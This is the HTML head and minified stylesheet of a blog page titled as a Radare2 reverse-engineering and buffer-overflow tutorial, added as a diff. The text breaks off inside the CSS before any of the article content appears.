@@ -1,0 +1,1395 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>Reverse engineering x64 binaries with Radare2 - Exploiting basic Buffer Overflows</title>
+  <meta name='description' content='All things cyber'>
+
+  <link rel="canonical" href="http://localhost:4000/reversing-radare2-2">
+  <link rel="alternate" type="application/rss+xml" title="Artik Blue" href="/feed.xml">
+
+  <!-- Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Ionicons -->
+  <link href="https://unpkg.com/ionicons@4.2.2/dist/css/ionicons.min.css" rel="stylesheet">
+
+  <style>
+  
+      /*!------------------------------------------------------------------
+[MAIN STYLESHEET]
+-------------------------------------------------------------------*/.list-reset{list-style-type:none;margin:0;padding:0}.clearfix::after,.clearfix ::before{content:"";display:table;clear:both}.screen-reader-text{clip:rect(1px, 1px, 1px, 1px);height:1px;overflow:hidden;position:absolute !important;width:1px;word-wrap:normal !important}/*! normalize.css v8.0.0 | MIT License | github.com/necolas/normalize.css */html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}h1{font-size:2em;margin:0.67em 0}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace, monospace;font-size:1em}a{background-color:transparent}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace, monospace;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-0.25em}sup{top:-0.5em}img{border-style:none}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}button,[type="button"],[type="reset"],[type="submit"]{-webkit-appearance:button}button::-moz-focus-inner,[type="button"]::-moz-focus-inner,[type="reset"]::-moz-focus-inner,[type="submit"]::-moz-focus-inner{border-style:none;padding:0}button:-moz-focusring,[type="button"]:-moz-focusring,[type="reset"]:-moz-focusring,[type="submit"]:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:0.35em 0.75em 0.625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{vertical-align:baseline}textarea{overflow:auto}[type="checkbox"],[type="radio"]{box-sizing:border-box;padding:0}[type="number"]::-webkit-inner-spin-button,[type="number"]::-webkit-outer-spin-button{height:auto}[type="search"]{-webkit-appearance:textfield;outline-offset:-2px}[type="search"]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details{display:block}summary{display:list-item}template{display:none}[hidden]{display:none}body,h1,h2,h3,h4,h5,h6,p,blockquote,pre,dl,dd,ol,ul,fieldset,legend,figure,hr{margin:0;padding:0}li>ul,li>ol{margin-bottom:0}table{border-collapse:collapse;border-spacing:0}h1,h2,h3,h4,h5,h6,ul,ol,dl,blockquote,p,address,hr,table,fieldset,figure,pre{margin-bottom:30px}ul,ol,dd{margin-left:15px}ul li,ol li{margin-bottom:10px}.highlight{background:#161d25}.highlighter-rouge .highlight{background:#eef}.highlight .c{color:#998;font-style:italic}.highlight .err{color:#a61717;background-color:#e3d2d2}.highlight .k{font-weight:bold}.highlight .o{font-weight:bold}.highlight .cm{color:#998;font-style:italic}.highlight .cp{color:#999;font-weight:bold}.highlight .c1{color:#998;font-style:italic}.highlight .cs{color:#999;font-weight:bold;font-style:italic}.highlight .gd{color:#000;background-color:#fdd}.highlight .gd .x{color:#000;background-color:#faa}.highlight .ge{font-style:italic}.highlight .gr{color:#a00}.highlight .gh{color:#999}.highlight .gi{color:#000;background-color:#dfd}.highlight .gi .x{color:#000;background-color:#afa}.highlight .go{color:#888}.highlight .gp{color:#555}.highlight .gs{font-weight:bold}.highlight .gu{color:#aaa}.highlight .gt{color:#a00}.highlight .kc{font-weight:bold}.highlight .kd{font-weight:bold}.highlight .kp{font-weight:bold}.highlight .kr{font-weight:bold}.highlight .kt{color:#458;font-weight:bold}.highlight .m{color:#099}.highlight .s{color:#d14}.highlight .na{color:teal}.highlight .nb{color:#0086B3}.highlight .nc{color:#458;font-weight:bold}.highlight .no{color:teal}.highlight .ni{color:purple}.highlight .ne{color:#900;font-weight:bold}.highlight .nf{color:#900;font-weight:bold}.highlight .nn{color:#555}.highlight .nt{color:navy}.highlight .nv{color:teal}.highlight .ow{font-weight:bold}.highlight .w{color:#bbb}.highlight .mf{color:#099}.highlight .mh{color:#099}.highlight .mi{color:#099}.highlight .mo{color:#099}.highlight .sb{color:#d14}.highlight .sc{color:#d14}.highlight .sd{color:#d14}.highlight .s2{color:#d14}.highlight .se{color:#d14}.highlight .sh{color:#d14}.highlight .si{color:#d14}.highlight .sx{color:#d14}.highlight .sr{color:#009926}.highlight .s1{color:#d14}.highlight .ss{color:#990073}.highlight .bp{color:#999}.highlight .vc{color:teal}.highlight .vg{color:teal}.highlight .vi{color:teal}.highlight .il{color:#099}.container{max-width:1270px;padding-left:15px;padding-right:15px;margin:0 auto}@media only screen and (max-width: 1300px){.container{max-width:1100px}}@media only screen and (max-width: 1130px){.container{max-width:1000px}}@media only screen and (max-width: 1024px){.container{max-width:740px}}@media only screen and (max-width: 768px){.container{max-width:540px}}@media only screen and (max-width: 576px){.container{max-width:380px}}.row{display:flex;flex-wrap:wrap;flex:0 1 auto;flex-direction:row;box-sizing:border-box;margin-left:-15px;margin-right:-15px}.col{padding-left:15px;padding-right:15px}[class^="col-"]{flex:auto}.col-0{width:0%}.col-1{width:8.3333333333%}.col-2{width:16.6666666667%}.col-3{width:25%}.col-4{width:33.3333333333%}.col-5{width:41.6666666667%}.col-6{width:50%}.col-7{width:58.3333333333%}.col-8{width:66.6666666667%}.col-9{width:75%}.col-10{width:83.3333333333%}.col-11{width:91.6666666667%}.col-12{width:100%}.push-0{margin-left:0%}.push-1{margin-left:8.3333333333%}.push-2{margin-left:16.6666666667%}.push-3{margin-left:25%}.push-4{margin-left:33.3333333333%}.push-5{margin-left:41.6666666667%}.push-6{margin-left:50%}.push-7{margin-left:58.3333333333%}.push-8{margin-left:66.6666666667%}.push-9{margin-left:75%}.push-10{margin-left:83.3333333333%}.push-11{margin-left:91.6666666667%}.push-12{margin-left:100%}.pull-0{margin-right:0%}.pull-1{margin-right:8.3333333333%}.pull-2{margin-right:16.6666666667%}.pull-3{margin-right:25%}.pull-4{margin-right:33.3333333333%}.pull-5{margin-right:41.6666666667%}.pull-6{margin-right:50%}.pull-7{margin-right:58.3333333333%}.pull-8{margin-right:66.6666666667%}.pull-9{margin-right:75%}.pull-10{margin-right:83.3333333333%}.pull-11{margin-right:91.6666666667%}.pull-12{margin-right:100%}@media (max-width: 1024px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media (max-width: 1024px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}@media (max-width: 1024px){.col-d-0{width:0%}.col-d-1{width:8.3333333333%}.col-d-2{width:16.6666666667%}.col-d-3{width:25%}.col-d-4{width:33.3333333333%}.col-d-5{width:41.6666666667%}.col-d-6{width:50%}.col-d-7{width:58.3333333333%}.col-d-8{width:66.6666666667%}.col-d-9{width:75%}.col-d-10{width:83.3333333333%}.col-d-11{width:91.6666666667%}.col-d-12{width:100%}.push-d-0{margin-left:0%}.push-d-1{margin-left:8.3333333333%}.push-d-2{margin-left:16.6666666667%}.push-d-3{margin-left:25%}.push-d-4{margin-left:33.3333333333%}.push-d-5{margin-left:41.6666666667%}.push-d-6{margin-left:50%}.push-d-7{margin-left:58.3333333333%}.push-d-8{margin-left:66.6666666667%}.push-d-9{margin-left:75%}.push-d-10{margin-left:83.3333333333%}.push-d-11{margin-left:91.6666666667%}.push-d-12{margin-left:100%}.pull-d-0{margin-right:0%}.pull-d-1{margin-right:8.3333333333%}.pull-d-2{margin-right:16.6666666667%}.pull-d-3{margin-right:25%}.pull-d-4{margin-right:33.3333333333%}.pull-d-5{margin-right:41.6666666667%}.pull-d-6{margin-right:50%}.pull-d-7{margin-right:58.3333333333%}.pull-d-8{margin-right:66.6666666667%}.pull-d-9{margin-right:75%}.pull-d-10{margin-right:83.3333333333%}.pull-d-11{margin-right:91.6666666667%}.pull-d-12{margin-right:100%}}@media (max-width: 768px){.col-t-0{width:0%}.col-t-1{width:8.3333333333%}.col-t-2{width:16.6666666667%}.col-t-3{width:25%}.col-t-4{width:33.3333333333%}.col-t-5{width:41.6666666667%}.col-t-6{width:50%}.col-t-7{width:58.3333333333%}.col-t-8{width:66.6666666667%}.col-t-9{width:75%}.col-t-10{width:83.3333333333%}.col-t-11{width:91.6666666667%}.col-t-12{width:100%}.push-t-0{margin-left:0%}.push-t-1{margin-left:8.3333333333%}.push-t-2{margin-left:16.6666666667%}.push-t-3{margin-left:25%}.push-t-4{margin-left:33.3333333333%}.push-t-5{margin-left:41.6666666667%}.push-t-6{margin-left:50%}.push-t-7{margin-left:58.3333333333%}.push-t-8{margin-left:66.6666666667%}.push-t-9{margin-left:75%}.push-t-10{margin-left:83.3333333333%}.push-t-11{margin-left:91.6666666667%}.push-t-12{margin-left:100%}.pull-t-0{margin-right:0%}.pull-t-1{margin-right:8.3333333333%}.pull-t-2{margin-right:16.6666666667%}.pull-t-3{margin-right:25%}.pull-t-4{margin-right:33.3333333333%}.pull-t-5{margin-right:41.6666666667%}.pull-t-6{margin-right:50%}.pull-t-7{margin-right:58.3333333333%}.pull-t-8{margin-right:66.6666666667%}.pull-t-9{margin-right:75%}.pull-t-10{margin-right:83.3333333333%}.pull-t-11{margin-right:91.6666666667%}.pull-t-12{margin-right:100%}}@media (max-width: 576px){.col-m-0{width:0%}.col-m-1{width:8.3333333333%}.col-m-2{width:16.6666666667%}.col-m-3{width:25%}.col-m-4{width:33.3333333333%}.col-m-5{width:41.6666666667%}.col-m-6{width:50%}.col-m-7{width:58.3333333333%}.col-m-8{width:66.6666666667%}.col-m-9{width:75%}.col-m-10{width:83.3333333333%}.col-m-11{width:91.6666666667%}.col-m-12{width:100%}.push-m-0{margin-left:0%}.push-m-1{margin-left:8.3333333333%}.push-m-2{margin-left:16.6666666667%}.push-m-3{margin-left:25%}.push-m-4{margin-left:33.3333333333%}.push-m-5{margin-left:41.6666666667%}.push-m-6{margin-left:50%}.push-m-7{margin-left:58.3333333333%}.push-m-8{margin-left:66.6666666667%}.push-m-9{margin-left:75%}.push-m-10{margin-left:83.3333333333%}.push-m-11{margin-left:91.6666666667%}.push-m-12{margin-left:100%}.pull-m-0{margin-right:0%}.pull-m-1{margin-right:8.3333333333%}.pull-m-2{margin-right:16.6666666667%}.pull-m-3{margin-right:25%}.pull-m-4{margin-right:33.3333333333%}.pull-m-5{margin-right:41.6666666667%}.pull-m-6{margin-right:50%}.pull-m-7{margin-right:58.3333333333%}.pull-m-8{margin-right:66.6666666667%}.pull-m-9{margin-right:75%}.pull-m-10{margin-right:83.3333333333%}.pull-m-11{margin-right:91.6666666667%}.pull-m-12{margin-right:100%}}img[data-action="zoom"]{cursor:pointer;cursor:-webkit-zoom-in;cursor:-moz-zoom-in}.zoom-img,.zoom-img-wrap{position:relative;z-index:666;-webkit-transition:all 300ms;-o-transition:all 300ms;transition:all 300ms}img.zoom-img{cursor:pointer;cursor:-webkit-zoom-out;cursor:-moz-zoom-out}.zoom-overlay{z-index:420;background:#161d25;position:fixed;top:0;left:0;right:0;bottom:0;pointer-events:none;opacity:0;-webkit-transition:opacity 300ms;-o-transition:opacity 300ms;transition:opacity 300ms}.zoom-overlay-open .zoom-overlay{opacity:1}.zoom-overlay-open,.zoom-overlay-transitioning{cursor:default}.animate{animation:animateElement cubic-bezier(0.3, 0.45, 0.45, 0.95) 0.75s;animation-duration:0.5s;animation-iteration-count:1;transition:transform .15s}@keyframes animateElement{0%{opacity:0;transform:translate(0px, 50px)}100%{opacity:1;transform:translate(0px, 0px)}}*,*::after,*::before{box-sizing:border-box}body{font-family:"Inter",Helvetica Neue,Helvetica,Arial,sans-serif;font-size:18px;line-height:34px;border:10px solid #131212;color:#fff;background-color:#131212;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}body.dark .footer__head{background:#131212}@media only screen and (max-width: 768px){body.dark .footer__head{padding:40px}}@media only screen and (max-width: 576px){body.dark .footer__head{padding:30px}}body.dark .subscribe-form .subscribe-email{background:#161d25}@media only screen and (max-width: 576px){body{font-size:16px;line-height:29px;border-width:5px}}*::selection{color:#fff;background-color:rgba(0,112,255,0.8)}h1,h2,h3,h4,h5,h6{font-family:"Inter",Helvetica Neue,Helvetica,Arial,sans-serif;font-weight:700;line-height:1.3;letter-spacing:-1px}h1{font-size:36px}h2{font-size:28px}h3{font-size:24px}h4{font-size:20px}h5{font-size:18px}h6{font-size:16px}blockquote{position:relative;margin-top:30px;padding:25px 25px 15px 60px;font-size:30px;line-height:45px;font-weight:600;font-style:normal}blockquote::before{content:'\201C';position:absolute;top:0.35em;left:0.05em;font-size:3.5em;color:#0070ff}blockquote p{margin-bottom:10px}blockquote cite{display:inline-block;margin-top:7px;font-size:15px;font-style:normal;color:#ccc}blockquote cite:before{content:'\2014' '\00a0'}@media only screen and (max-width: 1024px){blockquote{font-size:24px;line-height:37px}}@media only screen and (max-width: 576px){blockquote{padding:38px 0 15px 35px;font-size:21px;line-height:31px}}pre{overflow:auto;padding:15px;margin-bottom:0;font-size:14px;white-space:pre-wrap;word-wrap:break-word;word-break:break-all}img,.zoom-img-wrap{max-width:100%;height:auto;vertical-align:middle}img+em,.zoom-img-wrap+em{display:block;margin-top:15px;font-size:14px;line-height:22px;font-style:normal;font-weight:normal;text-align:center;color:#fff}img+em a,.zoom-img-wrap+em a{border-bottom:1px solid #fff}img+em a:hover,.zoom-img-wrap+em a:hover{color:#fff;border-color:#0070ff}a{text-decoration:none;color:#fff;transition:all 0.35s}a:hover{color:#fff}hr{display:block;height:1px;width:100px;margin:50px 0;border:0;background:#000}.wrapper-page{margin-bottom:70px}@media only screen and (max-width: 768px){.wrapper-page{margin-bottom:60px}}@media only screen and (max-width: 576px){.wrapper-page{margin-bottom:40px}}.button{display:inline-block;height:45px;padding:0 20px;font-size:15px;font-weight:700;border:none;outline:none;color:#fff;background:#0070ff;transition:all 0.35s;cursor:pointer}.button:hover{color:#fff;background:#0065e6}.lazy{opacity:0;transition:0.3s}.lazy.loaded{opacity:1}.top{position:fixed;bottom:40px;right:-100px;z-index:1;width:28px;height:40px;font-size:28px;line-height:40px;text-align:center;border-radius:6px;background-color:#161d25;color:#fff;cursor:pointer;transition:all .25s ease;box-shadow:0px 0px 20px rgba(0,0,0,0.05)}.top:hover{color:#fff;background-color:#0070ff}.top.is-active{right:40px}@media only screen and (max-width: 768px){.top{bottom:25px}.top.is-active{right:30px}}.header{height:auto;border-bottom:1px solid #131212;background:#161d25;transition:all 0.35s}.header .header__overlay{position:fixed;top:0;right:0;bottom:0;left:0;z-index:15;background-color:rgba(17,17,17,0.7);cursor:pointer;opacity:0;visibility:hidden;transition:all 0.5s ease}@media only screen and (max-width: 1024px){.header .header__overlay.is-visible{opacity:1;visibility:visible}}.header__inner{position:relative;display:flex;align-items:center;min-height:80px}.logo__link{font-size:20px;line-height:26px;font-weight:700}.logo__link:hover{color:#0070ff}.logo__image{max-height:50px}.main-nav{margin-left:80px}@media only screen and (max-width: 1024px){.main-nav{position:fixed;top:0;left:inherit;right:-300px;bottom:0;transform:none;z-index:100;width:300px;height:100vh;padding:40px 30px 30px;border:10px solid #131212;transition:right 0.5s cubic-bezier(0.7, 0.4, 0, 1);background:#161d25}.main-nav.is-open{right:0}.main-nav .nav__list{width:100%}.main-nav .nav__list .nav__item{display:block;margin:0 10px}.main-nav .nav__list .nav__item:last-child{margin-right:10px}.main-nav .nav__list .nav__item .nav__link{display:block;padding:10px 0;font-size:16px;line-height:26px;font-weight:500}}@media only screen and (max-width: 576px){.main-nav{padding:20px 30px;border-width:5px}}.main-nav__box{display:flex;align-items:center}.main-nav__box .nav__icon-close{display:none;font-size:24px;text-align:right}.main-nav__box .nav__icon-close .ion-md-close{transition:all 0.35s;cursor:pointer}.main-nav__box .nav__icon-close .ion-md-close:hover{color:#0070ff}.main-nav__box .nav__title{display:none}@media only screen and (max-width: 1024px){.main-nav__box{display:block}.main-nav__box .nav__icon-close{display:block}.main-nav__box .nav__title{display:block;margin:0 10px 15px;padding-bottom:15px;font-size:24px;font-weight:700;color:#fff;border-bottom:1px solid #131212}}.nav__list .nav__item{display:inline-block;margin:0 20px}.nav__list .nav__item:last-child{margin-right:40px}.nav__list .nav__item .nav__link{font-size:15px;line-height:24px;font-weight:500}.nav__list .nav__item .nav__link:hover{color:#0070ff}.nav-buttons{display:flex;align-items:center;margin-left:auto;font-size:21px;color:#fff;cursor:pointer}.nav-buttons .nav__icon{transition:all 0.35s}.nav-buttons .nav__icon:hover{color:#0070ff}.nav-buttons .nav__icon:first-child{margin-right:15px}.nav-buttons .nav__icon-menu{display:none}@media only screen and (max-width: 1024px){.nav-buttons{margin-left:auto}.nav-buttons .nav__icon-menu{display:block}}.search{position:fixed;top:0;left:0;right:0;bottom:0;z-index:-1;transform:scale(0.95);overflow:auto;opacity:0;background:#131212;transition:all .25s ease}.search.is-visible{transform:scale(1);z-index:100;opacity:1;transition:all .25s ease}.search__box{width:50%;margin:0 auto;padding-top:140px}@media only screen and (max-width: 1024px){.search__box{width:80%;padding-top:100px}}.search__group{position:relative;margin-bottom:50px}.search__group .search__close{position:absolute;right:20px;top:17px;font-size:27px;line-height:40px;cursor:pointer;transition:all .2s}.search__group .search__close:hover{color:#0070ff}.search__group .search__text{width:100%;padding:20px;font-size:21px;line-height:31px;border:2px solid transparent;border-radius:4px;color:#fff;background:#161d25;outline:none;transition:all .2s}.search__group .search__text:focus{border-color:#0070ff}.search__group .search__text::placeholder{font-weight:500;color:#fff}.search__group .search__text::-ms-clear{display:none}.search-results-list .no-results{width:100%;font-size:21px;font-weight:600;text-align:center;color:#fff}.pagination{margin-top:40px}@media only screen and (max-width: 768px){.pagination{margin-top:30px}}@media only screen and (max-width: 576px){.pagination{margin-top:20px}}.pagination__inner{display:flex;justify-content:center;align-items:center}.pagination__list{display:flex;font-weight:600;height:40px;padding:0 20px;font-size:14px;line-height:40px;border-radius:3px;box-shadow:0px 0px 20px rgba(0,0,0,0.05);color:#fff;background-color:#161d25}.pagination__count{display:inline-block;padding:0 15px;margin:0 15px;font-size:13px;border-left:1px solid rgba(255,255,255,0.1);border-right:1px solid rgba(255,255,255,0.1);color:#ccc}.pagination__next i,.pagination__prev i{font-size:13px}.pagination__next:hover,.pagination__prev:hover{color:#0070ff}.pagination__next.disabled,.pagination__prev.disabled{opacity:0.2;cursor:not-allowed;color:inherit}.pagination__next i{margin-left:4px}.pagination__prev i{margin-right:4px}.footer{padding-top:70px;background:#161d25}.footer .row .col{flex-grow:1}.footer .footer__inner{padding:60px 0;margin:0 60px 0;background-image:-webkit-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-moz-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:-ms-repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);background-image:repeating-radial-gradient(center center, rgba(0,112,255,0.7), rgba(0,112,255,0.7) 2px, transparent 2px, transparent 100%);-webkit-background-size:15px 15px;-moz-background-size:15px 15px;background-size:15px 15px}.footer .footer__head{margin:0 -60px;padding:60px;background:#161d25;box-shadow:0 10px 40px rgba(0,0,0,0.07)}.footer .footer__content{padding:60px 0}@media only screen and (max-width: 1024px){.footer .row .col:last-child>.widget{margin-bottom:0}}@media only screen and (max-width: 768px){.footer{padding-top:60px}.footer .footer__inner{padding:0;margin:0;background-image:none}.footer .footer__head{margin:0;padding:0;box-shadow:none}}@media only screen and (max-width: 576px){.footer{padding-top:50px}}@media only screen and (max-width: 1024px){.widget{margin-bottom:30px}}@media only screen and (max-width: 576px){.widget{margin-bottom:40px}}.widget__head{margin-bottom:20px}.widget__head .widget__title{margin:0;font-size:24px;color:#fff}.widget-gallery{padding:0 35px}@media only screen and (max-width: 1024px){.widget-gallery{padding:0}}.recent-posts{position:relative;display:flex;margin-bottom:15px}.recent-posts:last-child{margin-bottom:0}.recent-posts__header{margin-right:15px}.recent-posts__image{position:relative;display:block;margin-right:15px;min-width:80px;height:80px;background-size:cover;background-position:center;background-repeat:no-repeat;background-color:#131212}.recent-posts__image img{position:absolute;top:0;width:100%;height:100%;object-fit:cover}.recent-posts__date{margin-bottom:5px;font-size:13px;line-height:16px;color:#ccc}.recent-posts__title{margin-bottom:0;font-size:17px;line-height:22px;font-weight:700}.recent-posts__title a{color:#fff}.recent-posts__title a:hover{color:#fff}.widget-subscribe .subscribe__inner{display:flex;flex-direction:column;justify-content:space-between}.widget-subscribe .subscribe__group{margin-bottom:20px}.widget-subscribe .subscribe__group .subscribe__title{margin-bottom:15px;color:#fff}.widget-subscribe .subscribe__group .subscribe__description{font-size:15px;line-height:22px;color:#ccc}.widget-subscribe .subscribe-form{position:relative;height:60px}.widget-subscribe .subscribe-form .subscribe-email{width:100%;height:100%;padding:20px;font-size:14px;line-height:19px;font-weight:500;color:rgba(255,255,255,0.8);border:2px solid #131212;background:transparent;transition:border-color .2s ease-in-out;outline:0}.widget-subscribe .subscribe-form .subscribe-email::placeholder{color:rgba(255,255,255,0.8)}.widget-subscribe .subscribe-form 